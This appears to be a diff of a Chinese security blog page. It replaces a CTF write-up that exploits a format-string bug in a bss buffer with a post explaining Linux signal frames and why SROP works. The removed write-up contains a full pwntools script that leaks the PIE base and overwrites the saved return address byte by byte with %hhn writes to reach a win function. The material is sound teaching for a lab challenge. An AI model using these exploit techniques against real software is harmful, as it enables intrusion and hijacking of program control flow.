@@ -19,24 +19,23 @@
   <meta name="author" content="roxy">
   <meta name="keywords" content="">
   
-    <meta name="description" content="今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)… 先来看看题目逻辑 1234567891011121314151617undefined8">
+    <meta name="description" content="此篇blog为SROP那一章的后续，主要补充一下linux中的信号处理机制 为什么写这篇呢，因为我发现我虽然能构造SROP利用，但是却并不明白为什么能这么做 最近在学习操作系统时，学习到了这么一个知识点，进程在进行上下文切换时，也会有保存寄存器，恢复寄存器这样的一个动作，但是保存的地方是内核栈，那我为什么在用户栈布置上下文(context)时能make sense呢?  经过查阅资料发现，原来这两">
 <meta property="og:type" content="article">
-<meta property="og:title" content="fmt_bss">
-<meta property="og:url" content="https://roxy5201314.github.io/2026/01/02/fmt-bss/index.html">
+<meta property="og:title" content="signal">
+<meta property="og:url" content="https://roxy5201314.github.io/2026/01/15/signal/index.html">
 <meta property="og:site_name" content="roxy&#39;s blog">
-<meta property="og:description" content="今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)… 先来看看题目逻辑 1234567891011121314151617undefined8">
+<meta property="og:description" content="此篇blog为SROP那一章的后续，主要补充一下linux中的信号处理机制 为什么写这篇呢，因为我发现我虽然能构造SROP利用，但是却并不明白为什么能这么做 最近在学习操作系统时，学习到了这么一个知识点，进程在进行上下文切换时，也会有保存寄存器，恢复寄存器这样的一个动作，但是保存的地方是内核栈，那我为什么在用户栈布置上下文(context)时能make sense呢?  经过查阅资料发现，原来这两">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://roxy5201314.github.io/images/7.png">
-<meta property="og:image" content="https://roxy5201314.github.io/images/8.png">
-<meta property="article:published_time" content="2026-01-02T10:57:56.000Z">
-<meta property="article:modified_time" content="2026-01-02T15:40:46.426Z">
+<meta property="og:image" content="https://roxy5201314.github.io/images/9.png">
+<meta property="article:published_time" content="2026-01-15T09:57:07.000Z">
+<meta property="article:modified_time" content="2026-01-15T11:15:37.614Z">
 <meta property="article:author" content="roxy">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://roxy5201314.github.io/images/7.png">
+<meta name="twitter:image" content="https://roxy5201314.github.io/images/9.png">
   
   
   
-  <title>fmt_bss - roxy&#39;s blog</title>
+  <title>signal - roxy&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="fmt_bss"></span>
+            <span id="subtitle" data-typed-text="signal"></span>
           
         </div>
 
@@ -213,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-01-02 18:57" pubdate>
-          January 2, 2026 pm
+        <time datetime="2026-01-15 17:57" pubdate>
+          January 15, 2026 pm
         </time>
       </span>
     
@@ -225,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k words
+          2.6k words
         
       </span>
     
@@ -236,7 +235,7 @@
         
         
         
-          31 mins
+          22 mins
         
       </span>
     
@@ -273,39 +272,56 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">fmt_bss</h1>
+            <h1 id="seo-header">signal</h1>
             
             
               <div class="markdown-body">
                 
-                <p>今天依旧是一道格式化字符串漏洞的题目，题目出自NewStarCTF2025的week5pwn</p>
-<p>hint:对于常规的栈上格式化字符串漏洞，可以任意构造自己的恶意数据来实现任意地址写，但是对于非栈上变量来说，就无法直接给出目的地址的指针，此时就需要留意栈上残留的内容，看看能不能找到可以利用的点(善用你的gdb)…</p>
-<p>先来看看题目逻辑</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <br>  setup();<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_00102048);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_001020c0);<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">memset</span>(global_buffer,<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">puts</span>(&amp;DAT_0010210d);   #一段嘲讽你的话<br>    read(<span class="hljs-number">0</span>,global_buffer,<span class="hljs-number">0xff</span>);<br>    <span class="hljs-built_in">printf</span>(global_buffer);  <span class="hljs-meta">#xswlhhh</span><br>    iVar1 = <span class="hljs-built_in">strcmp</span>(global_buffer,<span class="hljs-string">&quot;end\n&quot;</span>);<br>  &#125; <span class="hljs-keyword">while</span> (iVar1 != <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(&amp;DAT_0010211a);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+                <p>此篇blog为SROP那一章的后续，主要补充一下linux中的信号处理机制</p>
+<p>为什么写这篇呢，因为我发现我虽然能构造SROP利用，但是却并不明白为什么能这么做</p>
+<p>最近在学习操作系统时，学习到了这么一个知识点，进程在进行上下文切换时，也会有保存寄存器，恢复寄存器这样的一个动作，但是保存的地方是内核栈，那我为什么在用户栈布置上下文(context)时能<code>make sense</code>呢?</p>
+<p><img src="/images/9.png" srcset="/img/loading.gif" lazyload alt="如图所示"></p>
+<p>经过查阅资料发现，原来这两样东西完全是不同的机制。</p>
+<p>第一种情况，在进程进行上下文切换时，例如从进程A切换至进程B，进程A的寄存器此时保存在内核栈，待进程A重新被调度时，才会从内核栈恢复寄存器，重新进入进程A，此时用户不可控。</p>
+<p>第二种情况，也就是本文的主题，即linux系统的信号处理机制</p>
+<p>信号在硬件层面发生异常&#x2F;中断时，内核会向进程发送<strong>信号</strong>，通知用户进程发生了某种事情</p>
+<p>常见如:</p>
+<ul>
+<li><p>除数为零(异常) -&gt; SIGFPE</p>
+</li>
+<li><p>非法内存访问(异常) -&gt; SIGSEGV 也就是pwn手经常看到的<code>segmentation fault</code></p>
+</li>
+<li><p>当你按下<code>Ctrl+C</code>时(产生键盘中断) -&gt; SIGINT</p>
+</li>
+</ul>
+<p>那么，内核如何发送这个信号到用户进程呢，本质是在用户态调用了一个<code>signal handler</code>函数，想象一下，用户进程正在愉快地执行，此时发生了某种事件，于是内核决定发送信号，CPU此时立即进入内核态(trap)，此时内核要保存被打断的寄存器，这便是第一种情况<code>受限直接执行</code>的一部分，但是这些寄存器只是暂时保存在内核栈，不是最终保存位置，我们接着看。</p>
+<p>接下来，内核判断是否要处理信号，内核在一系列判断后，如果确定要发送这个<code>signal handler</code>，于是进入<code>signal delivery path</code>，接下来便是关键步骤:内核<strong>伪造</strong>用户态调用栈</p>
+<p>内核会在用户栈上分配一个<code>sigframe</code>，简化后大致如下所示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rt_sigframe</span> &#123;</span><br>    <span class="hljs-type">char</span> pretcode[<span class="hljs-number">8</span>];   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> <span class="hljs-title">uc</span>;</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">siginfo</span> <span class="hljs-title">info</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>
 
-<p>存在后门函数<code>win</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  FILE *__stream;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <span class="hljs-type">char</span> local_58 [<span class="hljs-number">72</span>];<br>  <span class="hljs-type">long</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  __stream = fopen(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br>  fgets(local_58,<span class="hljs-number">0x40</span>,__stream);<br>  <span class="hljs-built_in">printf</span>(&amp;DAT_00102010,local_58);<br>  fclose(__stream);<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这些分别代表什么？我们只需要关注两样东西</p>
+<p>首先，<code>char pretcode[8];</code>，这个地址通常是glibc提供的<code>trampoline</code>，我们不妨叫它<code>rt_sigreturn_trampoline</code>，指令你应该很熟悉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">mov rax, SYS_rt_sigreturn  //linux x86-64下即是15<br>syscall<br></code></pre></td></tr></table></figure>
 
-<p>明显存在格式化字符串漏洞，但是对比<code>bss_got</code>的不同之处在于之前我们输入形如<code>AAAA.%p.%p.%p.%p</code>可以看到A写在哪里以实现任意地址写，这次是bss段上的fmt，因此并没有那么容易任意写，我们看看有哪些可以利用的地方，比如，栈上残留的某个<strong>指针</strong>?</p>
-<p><img src="/images/7.png" srcset="/img/loading.gif" lazyload alt="stack"></p>
-<p>经过敏锐的观察，不难发现，第6个地址0x7fffffffdda0与第26个地址0x7fffffffde00在栈上存在着某种关系…</p>
-<p><code>0x7fffffffdda0 —▸ 0x7fffffffde00 ◂— 0</code></p>
-<p>怎么理解呢，二者也就是<strong>指针</strong>的关系</p>
-<p>0x7fffffffdda0是一个栈地址，存储着值0x7fffffffde00(即指向这个地址的指针)</p>
-<p>0x7fffffffde00是另一个栈地址，这里存储着0</p>
-<p>那么就有思路了，我们用逐字节写的方式修改<code>0x7fffffffdda0</code>处的指针，使其指向返回地址(rip)的位置，同理，用逐字节写的方式修改<code>0x7fffffffde00</code>处的值为win函数所在的地址</p>
-<p>可能略微有点抽象，但结果就是，返回地址(rip)变为了<code>0x7fffffffdda0</code>，而这又是一个指向<code>0x7fffffffde00</code>的指针，而<code>0x7fffffffde00</code>处的值已经被我们改写为了<code>win</code>，从而获得了<code>flag</code></p>
-<p>真是精妙绝伦啊~</p>
-<p>还有一点需要注意的是，程序是<code>pie enabled</code>(区别于<code>ASLR</code>)，但是也很明显，可以通过泄露的第一个地址<code>0x555555558060</code>获得pie基址</p>
-<p><img src="/images/8.png" srcset="/img/loading.gif" lazyload alt="vmmap"></p>
-<p>使用vmmap可以看到<code>pie_base = p1 - 0x4060</code></p>
-<p>那么<code>win = pie_base + win偏移</code></p>
-<p>接下来就来展示一下exp吧…</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;host&#x27;</span>,port)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p&#x27;</span>)<br>p_base = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x004060</span>    <span class="hljs-comment">#不保留换行符</span><br>log.success(<span class="hljs-string">f&#x27;p_base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(p_base)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;%p %p %p %p %p %p&#x27;</span>)<br>rip = <span class="hljs-built_in">int</span>(p.recvline(keepends=<span class="hljs-literal">False</span>).decode().split(<span class="hljs-string">&#x27; &#x27;</span>)[-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - <span class="hljs-number">0x98</span>  <span class="hljs-comment">#计算rip，由图可知rip = p6 - 0x98</span><br>log.success(<span class="hljs-string">f&#x27;rip -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(rip)&#125;</span>&#x27;</span>)<br><br>win = p_base + <span class="hljs-number">0x001289</span>  <span class="hljs-comment">#objdump -d ./bss_fmt | grep &quot;win&quot;</span><br>log.success(<span class="hljs-string">f&#x27;win -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(win)&#125;</span>&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%(<span class="hljs-number">256</span>*<span class="hljs-number">256</span>)&#125;</span>c%6$hn&#x27;</span>.encode())  <span class="hljs-comment">#改为rip</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#重复逐字节写...</span><br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">1</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">2</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">3</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">4</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())<br>win //= <span class="hljs-number">256</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;rip%<span class="hljs-number">256</span>+<span class="hljs-number">5</span>&#125;</span>c%6$hhn&#x27;</span>.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;!\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">f&#x27;%<span class="hljs-subst">&#123;win%<span class="hljs-number">256</span>&#125;</span>c%26$hhn&#x27;</span>.encode())  <span class="hljs-comment">#计划，通!</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p>然后，<code>ucontext</code>见下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>  uc_flags;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucontext</span> *<span class="hljs-title">uc_link</span>;</span><br>    <span class="hljs-type">stack_t</span>        uc_stack;<br>    <span class="hljs-type">sigset_t</span>       uc_sigmask;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> <span class="hljs-title">uc_mcontext</span>;</span>  <span class="hljs-comment">// 想我了吗?</span><br>&#125;;<br></code></pre></td></tr></table></figure>
 
-<p>也是成功拿到<code>flag</code>了~</p>
-<p>经过此题，应该能更加深刻地理解指针的本质，希望你能有所收获</p>
-<p>感谢阅读…</p>
+<p>看到<code>sigcontext</code>了吗，这便是SROP中利用的关键，保存着所有的寄存器</p>
+<p>代码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> __pad0;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> *<span class="hljs-title">fpstate</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> reserved1[<span class="hljs-number">8</span>];<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+<p>内核在用户栈伪造了这个<code>sigframe</code>后将<code>rip</code>设置为<code>handler</code>(即原执行流变为执行信号处理函数)，将<code>rsp</code>设置为<code>rt_sigreturn_trampoline</code>，在执行完信号处理函数后，因为<code>handler</code>函数的最后一条指令通常是<code>ret</code>，因此，<code>pop rip</code>，执行<code>rt_sigreturn_trampoline</code></p>
+<p>系统再次进入内核态，无条件地信任它自己在用户栈设置的<code>sigframe</code>，从<code>sigcontext</code>中恢复所有保存的寄存器，程序恢复至被中断前的执行点</p>
+<p>总结一下全过程:</p>
+<p>1.用户代码正常运行，突然，发生程序异常&#x2F;硬件中断等”事故”</p>
+<p>2.CPU进入内核态并保存寄存器到<code>pt_regs</code>(内核栈中的一个结构体，保存关键寄存器)</p>
+<p>3.内核决定要运行<code>handler</code>:在用户栈写<code>rt_sigframe</code>(把<code>pt_regs</code>的快照写到<code>uc_mcontext</code>)，然后修改<code>pt_regs</code>使得<code>rip=handler</code>,<code>rsp=rt_sigframe</code>, 并设置<code>handler</code>参数寄存器</p>
+<p>4.内核执行<code>return-to-user</code>(<strong>iretq</strong>)，CPU恢复并开始执行<code>handler</code>(看起来像是<code>normal call</code>)</p>
+<p>5.<code>handler</code>执行完，ret，返回到<code>trampoline</code>，<code>trampoline</code> 做<code>syscall SYS_rt_sigreturn</code></p>
+<p>6.内核进入<code>sys_rt_sigreturn</code>:<code>copy_from_user</code>把<code>rt_sigframe</code>中<code>sigcontext</code>保存的寄存器读回，写入 <code>pt_regs</code>，恢复信号</p>
+<p>7.内核再次<code>return-to-user</code>(<strong>iretq</strong>)，CPU将<code>pt_regs</code>中的所有寄存器恢复到硬件，程序继续被中断前的执行点</p>
+<p>至此，终于理解了SROP技术的本质:在用户栈上伪造一次“合法的信号处理返回现场”，然后<code>诱骗</code>内核执行<code>rt_sigreturn</code>(即想办法设置rax为15并syscall)，让内核按攻击者提供的上下文(<strong>sigcontext</strong>)恢复寄存器，彻底接管执行流!</p>
+<p>感谢阅读!</p>
 
                 
               </div>
@@ -323,8 +339,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>fmt_bss</div>
-      <div>https://roxy5201314.github.io/2026/01/02/fmt-bss/</div>
+      <div>signal</div>
+      <div>https://roxy5201314.github.io/2026/01/15/signal/</div>
     </div>
     <div class="license-meta">
       
@@ -336,13 +352,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>January 2, 2026</div>
+          <div>January 15, 2026</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>Updated on</div>
-          <div>January 2, 2026</div>
+          <div>January 15, 2026</div>
         </div>
       
       
@@ -373,18 +389,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/01/15/signal/" title="signal">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">signal</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/01/02/shellcode/" title="shellcode">
-                        <span class="hidden-mobile">shellcode</span>
+                      <a href="/2026/01/02/fmt-bss/" title="fmt_bss">
+                        <span class="hidden-mobile">fmt_bss</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
